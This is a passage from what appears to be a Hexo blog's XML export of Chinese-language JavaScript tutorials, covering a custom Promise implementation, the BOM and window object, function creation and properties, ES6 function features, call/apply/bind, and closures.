当状态为pending时，将then方法回调函数加入执行队列等待执行</span></span><br><span class="line">                <span class="keyword">case</span> PENDING:</span><br><span class="line">                    <span class="keyword">this</span>._fulfilledQueue.push(fulfilled);</span><br><span class="line">                    <span class="keyword">this</span>._rejectedQueue.push(rejected);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="comment">// 当状态已经改变时，立即执行对应的回调函数</span></span><br><span class="line">                <span class="keyword">case</span> FULFILLED:</span><br><span class="line">                    fulfilled(<span class="keyword">this</span>._value);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> REJECTED:</span><br><span class="line">                    rejected(<span class="keyword">this</span>._value);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加catch方法</span></span><br><span class="line">    <span class="keyword">catch</span>(onRejected) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.then(<span class="literal">null</span>, onRejected);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加静态resolve方法</span></span><br><span class="line">    <span class="keyword">static</span> resolve(value) &#123;</span><br><span class="line">        <span class="comment">// 如果参数是MyPromise实例或thenable对象，直接返回value</span></span><br><span class="line">        <span class="keyword">return</span> value <span class="keyword">instanceof</span> MyPromise || (value &amp;&amp; isFunction(value.then))</span><br><span class="line">            ? value</span><br><span class="line">            : <span class="keyword">new</span> MyPromise(<span class="function"><span class="params">resolve</span> =&gt;</span> resolve(value));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加静态reject方法</span></span><br><span class="line">    <span class="keyword">static</span> reject(value) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> reject(value));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加静态all方法</span></span><br><span class="line">    <span class="keyword">static</span> all(list) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> values = [];</span><br><span class="line">            <span class="keyword">let</span> count = list.length;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i <span class="keyword">in</span> list) &#123;</span><br><span class="line">                <span class="comment">// 数组参数如果不是MyPromise实例，先调用MyPromise.resolve</span></span><br><span class="line">                <span class="keyword">this</span>.resolve(list[i]).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">                    values[i] = res;</span><br><span class="line">                    <span class="comment">// 所有状态都变成fulfilled时返回的MyPromise状态就变成fulfilled</span></span><br><span class="line">                    --count &lt; <span class="number">1</span> &amp;&amp; resolve(values);</span><br><span class="line">                &#125;, reject);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加静态race方法</span></span><br><span class="line">    <span class="keyword">static</span> race(list) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> p <span class="keyword">of</span> list) &#123;</span><br><span class="line">                <span class="comment">// 只要有一个实例率先改变状态，新的MyPromise的状态就跟着改变</span></span><br><span class="line">                <span class="keyword">this</span>.resolve(p).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">                    resolve(res);</span><br><span class="line">                &#125;, reject);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">finally</span>(cb) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.then(</span><br><span class="line">            value =&gt; MyPromise.resolve(cb()).then(<span class="function"><span class="params">()</span> =&gt;</span> value),</span><br><span class="line">            reason =&gt; MyPromise.resolve(cb()).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> reason;</span><br><span class="line">            &#125;)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试代码</span></span><br><span class="line"><span class="keyword">new</span> MyPromise(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line">    resolve(<span class="number">3</span>);</span><br><span class="line">    MyPromise.resolve().then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="number">4</span>)).then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="number">5</span>));</span><br><span class="line">&#125;).then(<span class="function"><span class="params">num</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(num);</span><br><span class="line">&#125;).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">6</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">2</span>);</span><br><span class="line"><span class="comment">// 依次输出：1 2 4 3 5 6</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ECMA</category>
      </categories>
      <tags>
        <tag>ECMA</tag>
        <tag>Prmise</tag>
      </tags>
  </entry>
  <entry>
    <title>BOM详解</title>
    <url>/2018/04/17/ECMA_BOM%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p><code>BOM</code> 主要处理浏览器窗口和框架，不过通常浏览器特定的JavaScript 扩展都被看做 <code>BOM</code> 的一部分。这些扩展包括：</p>
<ul>
<li>弹出新的浏览器窗口</li>
<li>移动、关闭浏览器窗口以及调整窗口大小</li>
<li>提供 Web 浏览器详细信息的定位对象</li>
<li>提供用户屏幕分辨率详细信息的屏幕对象</li>
<li>对 cookie 的支持</li>
<li>IE 扩展了 BOM，加入了 ActiveXObject 类，可以通过 JavaScript 实例化 ActiveX 对象</li>
</ul>
<h3 id="认识BOM"><a href="#认识BOM" class="headerlink" title="认识BOM"></a>认识<code>BOM</code></h3><p><code>BOM</code>的核心是<code>window</code>，而<code>window</code>对象又具有双重角色，它既是通过<code>js</code>访问浏览器窗口的一个接口，又是一个<code>Global</code>（全局）对象。这意味着在网页中定义的任何对象，变量和函数，都以<code>window</code>作为其<code>Global</code>对象。</p>
<h3 id="一张图说明window对象"><a href="#一张图说明window对象" class="headerlink" title="一张图说明window对象"></a>一张图说明window对象</h3><p><img src="/static/img/window对象.svg" width="800"></p>
]]></content>
      <categories>
        <category>ECMA</category>
      </categories>
      <tags>
        <tag>ECMA</tag>
        <tag>BOM</tag>
      </tags>
  </entry>
  <entry>
    <title>ECMA-函数</title>
    <url>/2018/04/17/ECMA_%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h2 id="一、创建函数"><a href="#一、创建函数" class="headerlink" title="一、创建函数"></a>一、创建函数</h2><h4 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fnName</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="函数表达式"><a href="#函数表达式" class="headerlink" title="函数表达式"></a>函数表达式</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fnName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="使用Function构造函数"><a href="#使用Function构造函数" class="headerlink" title="使用Function构造函数"></a>使用Function构造函数</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 参数：Function 接收任意多的参数，但最后一个参数总被认为是函数体，前面的参数是传入新函数的参数</span></span><br><span class="line"><span class="keyword">var</span> fnName = <span class="keyword">new</span> <span class="built_in">Function</span>(a,  b,  c,  <span class="string">'return a + b + c'</span>);</span><br></pre></td></tr></table></figure>
<h4 id="【ES6】箭头函数"><a href="#【ES6】箭头函数" class="headerlink" title="【ES6】箭头函数"></a>【ES6】箭头函数</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fnName = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="二、函数的内部属性"><a href="#二、函数的内部属性" class="headerlink" title="二、函数的内部属性"></a>二、函数的内部属性</h2><h4 id="anguments"><a href="#anguments" class="headerlink" title="anguments"></a>anguments</h4><ul>
<li>类型：类数组对象，包含着传入函数的所有参数，和length属性</li>
<li>属性：<ul>
<li>anguments.length    // 实际传入函数参数的个数</li>
<li>anguments.callee【严格模式报错】    // 指向拥有这个anguments对象的函数，即函数本身</li>
</ul>
</li>
</ul>
<h4 id="this"><a href="#this" class="headerlink" title="this"></a>this</h4><p>函数据以执行的执行环境</p>
<p class="tip">箭头函数无 this</p>

<h2 id="三、函数的属性和方法"><a href="#三、函数的属性和方法" class="headerlink" title="三、函数的属性和方法"></a>三、函数的属性和方法</h2><h4 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h4><h6 id="fnName-caller"><a href="#fnName-caller" class="headerlink" title="fnName.caller"></a>fnName.caller</h6><ul>
<li>描述：保存着调用当前函数的函数的引用，如果在全局作用域调用当前函数，则返回 <code>null</code></li>
</ul>
<h6 id="fnName-length"><a href="#fnName-length" class="headerlink" title="fnName.length"></a>fnName.length</h6><ul>
<li>描述：表示函数希望接收的命名参数的个数<p class="tip"><br>注意：anguments.length 是实际传入函数参数的个数，而 fnName.length 是函数希望接收命名参数的个数，【ES6函数默认值对length的影响】：指定默认值以及在指定默认值的参数之后的所有参数，都不会计算到length中<br></p>

</li>
</ul>
<h6 id="fnName-prototype"><a href="#fnName-prototype" class="headerlink" title="fnName.prototype"></a>fnName.prototype</h6><ul>
<li>描述：保存函数的原型对象</li>
</ul>
<h6 id="【ES6】fnName-name"><a href="#【ES6】fnName-name" class="headerlink" title="【ES6】fnName.name"></a>【ES6】fnName.name</h6><ul>
<li>描述：获取函数的函数名</li>
<li>返回值：<ul>
<li>对于函数声明：返回函数名</li>
<li>对于匿名函数表达式：ES5返回空字符串，ES6返回变量的名字</li>
<li>对于具名函数表达式：返回函数的原名字</li>
<li>对于使用 new Function 创建的函数：返回 ‘anonymous’</li>
<li>对于使用bind方法返回的函数：返回 ‘bound 函数名’</li>
</ul>
</li>
</ul>
<h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><h6 id="fnName-apply"><a href="#fnName-apply" class="headerlink" title="fnName.apply()"></a>fnName.apply()</h6><h6 id="fnName-call"><a href="#fnName-call" class="headerlink" title="fnName.call()"></a>fnName.call()</h6><ul>
<li>描述：上面两个方法都用来在特殊的作用域调用函数，实际上等于设置函数体内的 <code>this</code> 对象的值</li>
<li>参数：<ul>
<li>第一个参数都是 this 的值</li>
<li>第二个参数：<code>apply</code> 接收 <code>anguments</code> 对象或数组，<code>call</code> 必须逐个列举出来</li>
</ul>
</li>
</ul>
<h6 id="fnName-bind"><a href="#fnName-bind" class="headerlink" title="fnName.bind()"></a>fnName.bind()</h6><ul>
<li>描述：根据已有函数，创建一个被绑定新 <code>this</code> 值的函数</li>
<li>参数：指定 <code>this</code> 值</li>
<li>返回值：<ul>
<li><code>{Function}</code> 被指定 <code>this</code> 值的新函数</li>
</ul>
</li>
</ul>
<h2 id="四、ES6对函数的扩展"><a href="#四、ES6对函数的扩展" class="headerlink" title="四、ES6对函数的扩展"></a>四、ES6对函数的扩展</h2><h4 id="参数默认值"><a href="#参数默认值" class="headerlink" title="参数默认值"></a>参数默认值</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params">a = <span class="number">2</span>, b = <span class="number">3</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p class="tip">【注意：函数的length属性，不会计算指定默认值的参数以及其后的所有参数】</p>

<h4 id="rest参数-…变量名"><a href="#rest参数-…变量名" class="headerlink" title="rest参数 […变量名]"></a>rest参数 […变量名]</h4><ul>
<li>描述：用于获取函数多余的参数，将其放入一个数组</li>
<li>注意：<ol>
<li>rest参数后面，不能有其他参数，否则会报错</li>
<li>rest参数不会被计算到函数的length属性中</li>
</ol>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">a, b, ...c</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(c);</span><br><span class="line">&#125;</span><br><span class="line">test(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>) <span class="comment">// [3, 4]</span></span><br><span class="line">test.length <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>
<h4 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h4><p>箭头函数有几点需要注意：</p>
<ul>
<li>函数体内的 <code>this</code> 对象是函数定义是所在的对象，而不是使用时的对象</li>
<li>不能用箭头函数当做构造函数，也就是说不能使用new命令，否则会报错</li>
<li>不可以使用 <code>arguments</code> 对象，该对象在函数体内不存在。如果要用，可以用 <code>Rest参数</code> 代替。</li>
<li>不可以使用 <code>yield</code> 命令，因此箭头函数不能用作 <code>Generator</code> 函数。</li>
<li>由于箭头函数没有自己的 <code>this</code>，所以当然也就不能用 <code>call()</code>、<code>apply()</code>、<code>bind()</code> 这些方法去改变 <code>this</code> 的指向。</li>
</ul>
<h4 id="尾递归"><a href="#尾递归" class="headerlink" title="尾递归"></a>尾递归</h4><p class="tip">【注意：ES6的尾调用优化只在严格模式下开启，正常模式是无效的。】</p>

<p>ES6明确规定，所有ECMAScript的实现，都必须部署“尾调用优化”。这就是说，在ES6中，只要使用尾递归，就不会发生栈溢出，相对节省内存。<br><br>相关概念：</p>
<ol>
<li>尾调用：函数的最后一步调用另一个函数，叫做尾调用尾调用的好处是：只保留内层函数的调用帧，节省内存</li>
<li>尾递归：函数尾调用自身，叫做尾递归</li>
<li>柯里化：将多参数函数转成单参数函数</li>
</ol>
<p>因为尾调用优化的本质是，只保留内层函数的调用帧，ES6的尾调用只在严格模式下生效，那么在非严格模式下是否可以进行尾调用优化呢？答案是可以的，有两种方案，一种是使用蹦床函数，一种是真正的尾调用，阮一峰的教程里有讲</p>
<h4 id="new-target【ES6】"><a href="#new-target【ES6】" class="headerlink" title="new.target【ES6】"></a>new.target【ES6】</h4><p><code>new</code> 操作符用来调用函数或ES6的类，从而创建一个实例，ES6为new操作符添加一个属性即：<code>new.target</code>，它保存着 <code>new</code> 操作符所作用的那个函数或类，一般用在构造函数里，如果使用函数或类时没有使用 <code>new</code> 操作符，那么 <code>new.target</code> 的值为 <code>undefined</code>。</p>
<p>利用 <code>new.target</code> 就可以写出不能单独被实例化，必须要继承后才能使用的类：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">new</span>.target === Super) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'不能单独实例化'</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sub</span> <span class="keyword">extends</span> <span class="title">Super</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Super() <span class="comment">// 报错</span></span><br><span class="line"><span class="keyword">new</span> Sub()   <span class="comment">// 正常使用</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ECMA</category>
      </categories>
      <tags>
        <tag>ECMA</tag>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>ECMA_理解call和apply</title>
    <url>/2018/04/19/ECMA-%E7%90%86%E8%A7%A3call%E5%92%8Capply/</url>
    <content><![CDATA[<h3 id="一：理解call和apply-及arguments-callee"><a href="#一：理解call和apply-及arguments-callee" class="headerlink" title="一：理解call和apply 及arguments.callee"></a>一：理解call和apply 及arguments.callee</h3><p>ECMAScript3给Function的原型定义了两个方法，他们是<code>Function.prototype.call</code> 和 <code>Function.prototype.apply</code>. 其实他们的作用是一样的，只是传递的参数不一样而已；</p>
<ol>
<li><code>apply</code>; 接受2个参数，第一个参数指定了函数体内<code>this</code>对象的指向，第二个参数为一个类似数组的集合，比如如下代码：</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> yunxi = <span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">console</span>.log([a,b]); <span class="comment">// [1,2]</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in">console</span>.log(<span class="keyword">this</span> === <span class="built_in">window</span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">yunxi.apply(<span class="literal">null</span>,[<span class="number">1</span>,<span class="number">2</span>]);</span><br></pre></td></tr></table></figure>
<p>如上代码，我们第一个参数传入<code>null</code>，函数体内默认会指向与宿主对象，即<code>window</code>对象；因此我们可以在yunxi函数内打印下值为true即可看到：</p>
<p>下面我们来看看使用<code>call</code>方法的实例如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> yunxi = <span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">console</span>.log([a,b]); <span class="comment">// [1,2]</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in">console</span>.log(<span class="keyword">this</span> === <span class="built_in">window</span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">yunxi.call(<span class="literal">null</span>,<span class="number">1</span>,<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
<p>可以看到 <code>call</code>方法的第二个参数是以逗号隔开的参数；</p>
<p>那么<code>call</code>和<code>apply</code>用在什么地方呢？</p>
<ol>
<li><code>call</code>和<code>apply</code> 最常见的用途是改变函数体内的<code>this</code>指向，如下代码:</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> longen = &#123;</span><br><span class="line">    name:<span class="string">'yunxi'</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> longen2 = &#123;</span><br><span class="line">    name: <span class="string">'我叫涂根华'</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> name = <span class="string">"我是来测试的"</span>;</span><br><span class="line"><span class="keyword">var</span> getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(getName()); <span class="comment">// 打印 "我是来测试的";</span></span><br><span class="line"><span class="built_in">console</span>.log(getName.call(longen)); <span class="comment">// 打印 yunxi</span></span><br><span class="line"><span class="built_in">console</span>.log(getName.call(longen2)); <span class="comment">// 打印 "我叫涂根华"</span></span><br></pre></td></tr></table></figure>
<p>第一次调用 <code>getName()</code>方法，因为它是普通函数调用，所以它的this指向与window，因此打印出全局对象的<code>name</code>的值；</p>
<p>第二次调用<code>getName.call(longen)</code>; 执行这句代码后，getName这个方法的内部指针this指向于<code>longen</code>这个对象了，因此打印<code>this.name</code>实际上是<code>longen.name</code>，因此返回的是<code>name=”yunxi”</code>;</p>
<p>但是<code>this</code>指针也有列外的情况，比如一个点击元素，当我们点击一个元素的时候，<code>this</code>指针就指向与那个点击元素，但是当我们在内部再包含一个函数后，在函数内再继续调用<code>this</code>的话，那么现在的<code>this</code>指针就指向了<code>window</code>了；比如如下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"longen"</span>).onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">// this 就指向于div元素对象了</span></span><br><span class="line">    <span class="keyword">var</span> func = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">// 打印出window对象</span></span><br><span class="line">    &#125;</span><br><span class="line">    func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如上代码。可以看到外部<code>this</code>指向与被点击的那个元素，内部普通函数调用，<code>this</code>指针都是指向于window对象。但是我们可以使用<code>call</code>或者<code>apply</code>方法来改变<code>this</code>的指针的；如下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"longen"</span>).onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">// this 就指向于div元素对象了</span></span><br><span class="line">    <span class="keyword">var</span> func = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">// 就指向于div元素对象了</span></span><br><span class="line">    &#125;</span><br><span class="line">    func.call(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如上代码我们使用<code>call</code>方法调用func函数，使<code>this</code>指向与<code>func</code>这个对象了，当然上面的方法我们还可以不使用<code>call</code>或者<code>apply</code>方法来改变<code>this</code>的指针，我们可以在外部先使用一个变量来保存<code>this</code>的指针，在内部调用的时候我们可以使用哪个变量即可，如下代码演示：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"longen"</span>).onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">// this 就指向于div元素对象了</span></span><br><span class="line">    <span class="keyword">var</span> self = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">var</span> func = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(self); <span class="comment">// 就指向于div元素对象了</span></span><br><span class="line">    &#125;</span><br><span class="line">    func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="arguments-callee的理解"><a href="#arguments-callee的理解" class="headerlink" title="arguments.callee的理解"></a>arguments.callee的理解</h4><p><code>callee</code>是<code>arguments</code>的一个属性，它可以被用作当前函数或函数体执行的环境中，或者说调用一个匿名函数；返回的是当前正在被执行的Function对象；简单的来说就是当前执行环境的函数被调用时候，<code>arguments.callee</code>对象会指向与自身，就是当前的那个函数的引用；</p>
<p>如下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> count = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> test = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(count + <span class="string">" -- "</span> + (test.length == <span class="built_in">arguments</span>.callee.length) );</span><br><span class="line">    <span class="comment">// 打印出 1 -- true 2 -- true  3 -- true</span></span><br><span class="line">    <span class="keyword">if</span> (count++ &lt; <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="comment">// 调用test()函数自身</span></span><br><span class="line">        <span class="built_in">arguments</span>.callee();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">test();</span><br></pre></td></tr></table></figure>
<p><code>arguments.callee()</code>的含义是调用当前正在执行的函数自身，比如上面的test的匿名函数；</p>
<h4 id="Function-prototype-bind介绍"><a href="#Function-prototype-bind介绍" class="headerlink" title="Function.prototype.bind介绍"></a>Function.prototype.bind介绍</h4><p>目前很多高级浏览器都支持<code>Function.prototype.bind</code>方法，该方法用来指定函数内部的<code>this</code>指向。为了支持各个浏览器，我们也可以自己来简单的模拟一个~</p>
<p>如下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.bind = <span class="function"><span class="keyword">function</span>(<span class="params">context</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> self = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> self.apply(context,<span class="built_in">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> yunxi = &#123;</span><br><span class="line">    name: <span class="string">'yunxi'</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> func = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name); <span class="comment">// yunxi</span></span><br><span class="line">&#125;.bind(yunxi);</span><br><span class="line"></span><br><span class="line">func();</span><br></pre></td></tr></table></figure>
<p>如上代码所示：<code>func</code>这个函数使用调用<code>bind</code>这个方法，并且把对象<code>yunxi</code>作为参数传进去，然后bind函数使用return返回一个函数，当我们调用func()执行这个方法的时候，其实我们就是在调用<code>bind</code>方法内的<code>return</code>返回的那个函数，在返回的那个函数内<code>context</code>的上下文其实就是我们以参数yunxi对象传进去的，因此<code>this</code>指针指向与<code>yunxi</code>这个对象了~ 所以打印出<code>this.name</code> 就是<code>yunxi</code>那个对象的<code>name</code>了;</p>
<p>除了上面我们看到的介绍<code>apply</code>或者<code>call</code>方法可以改变<code>this</code>指针外，我们还可以使用<code>call</code>或者<code>apply</code>来继承对象的方法；实质也就是改变<code>this</code>的指针了；</p>
<p>比如有如下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Yunxi = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Longen = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Yunxi.apply(<span class="keyword">this</span>,<span class="built_in">arguments</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Longen.prototype.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> longen = <span class="keyword">new</span> Longen(<span class="string">"tugenhua"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(longen.getName());  <span class="comment">// 打印出tugenhua</span></span><br></pre></td></tr></table></figure>
<p>如上代码：我先实例化<code>Longen</code>这个对象，把参数传进去，之后使用<code>Yunxi.apply(this,arguments)</code>这句代码来改变<code>Longen</code>这个对象的<code>this</code>的指针，使他指向了<code>Yunxi</code>这个对象，因此<code>Yunxi</code>这个对象保存了<code>longen</code>这个实例化对象的参数<code>tugenhua</code>，因此当我们调用<code>longen.getName</code>这个方法的时候，我们返回<code>this.name</code>，即我们可以认为返回的是 <code>Yunxi.name</code> 因此返回的是 <code>tugenhua</code>，我们只是借用了下<code>Yunxi</code>这个对象内的<code>this.name</code>来保存<code>Longen</code>传进去的参数而已；</p>
<h3 id="二：闭包的理解"><a href="#二：闭包的理解" class="headerlink" title="二：闭包的理解"></a>二：闭包的理解</h3><p>闭包的结构有如下2个特性</p>
<ol>
<li><p>封闭性：外界无法访问闭包内部的数据，如果在闭包内声明变量，外界是无法访问的，除非闭包主动向外界提供访问接口；</p>
</li>
<li><p>持久性：一般的函数，调用完毕之后，系统自动注销函数，而对于闭包来说，在外部函数被调用之后，闭包结构依然保存在</p>
</li>
</ol>
<p>系统中，闭包中的数据依然存在，从而实现对数据的持久使用。</p>
<p>缺点：</p>
<p>使用闭包会占有内存资源，过多的使用闭包会导致内存溢出等.</p>
<p>如下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a = x;</span><br><span class="line">    <span class="keyword">var</span> b = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> b = a(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">console</span>.log(b()); <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
